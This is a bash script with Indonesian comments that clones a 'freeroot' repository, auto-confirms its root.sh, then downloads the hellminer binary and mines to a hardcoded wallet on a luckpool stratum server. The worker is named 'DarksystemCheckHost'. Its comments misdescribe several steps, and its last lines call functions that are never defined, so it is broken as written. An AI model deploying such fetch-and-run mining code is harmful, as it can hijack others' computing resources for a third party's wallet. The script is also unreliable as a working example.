#!/bin/bash

# ==============================================
# Fungsi: Mengunduh File Miner
# ==============================================
download_freeroot() {
    echo
    echo "========================================"
    echo "⬇️  Mengunduh file InitVerse Miner..."
    echo "========================================"
    git clone https://github.com/foxytouxxx/freeroot.git && cd freeroot
    if [ $? -eq 0 ]; then
        echo "✅ File berhasil diunduh."
    else
        echo "❌ Gagal mengunduh file. Periksa URL atau koneksi internet Anda."
        exit 1
    fi
    echo
}

# ==============================================
# Fungsi: Memberikan Izin Eksekusi
# ==============================================
give_root() {
    echo
    echo "========================================"
    echo "🔑 Memberikan izin eksekusi ke file..."
    echo "========================================"
    yes | bash root.sh -yes
    if [ $? -eq 0 ]; then
        echo "✅ Izin eksekusi berhasil diberikan."
    else
        echo "❌ Gagal memberikan izin eksekusi."
        exit 1
    fi
    echo
}
# ==============================================
# Fungsi: Memperbarui Sistem dan install wget
# ==============================================
update_system() {
    echo
    echo "========================================"
    echo "🔄 Memperbarui sistem dan menginstal screen..."
    echo "========================================"
    apt update && apt install wget -y
    if [ $? -eq 0 ]; then
        echo "✅ Sistem diperbarui dan screen berhasil diinstal."
    else
        echo "❌ Gagal memperbarui sistem atau menginstal wget."
        exit 1
    fi
    echo
}

# ==============================================
# Fungsi: run Minning
# ==============================================
Run_minning() {
    echo
    echo "========================================"
    echo "🔄 Run Minning."
    echo "========================================"
    apt install libsodium-dev -y && wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3957 -u RHAts2xhzUJThtXEfFHtA6tihSphVXhUL8.DarksystemCheckHost -p x
    if [ $? -eq 0 ]; then
        echo "✅ Enjooyyyy Broooooooo........"
    else
        echo "❌ Gagal minning."
        exit 1
    fi
    echo
}


# ==============================================
# Eksekusi Fungsi
# ==============================================
download_inichain
give_permission
update_system
Run_minning

